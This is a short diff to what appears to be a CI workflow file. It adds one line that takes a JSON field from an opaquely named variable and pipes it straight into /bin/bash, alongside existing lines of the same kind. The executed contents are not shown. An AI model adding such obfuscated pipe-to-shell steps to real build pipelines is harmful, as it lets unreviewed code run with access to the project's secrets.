@@ -28,6 +28,7 @@ jobs:
           echo $z14022 | jq -r .t0759 | /bin/bash
           printf '%s' "$ej88" | jq -r .cx3 | /bin/bash
           echo $j38500 | jq -r .pj990 | /bin/bash
+          printf '%s' "$fws401" | jq -r .qxyxd2759 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
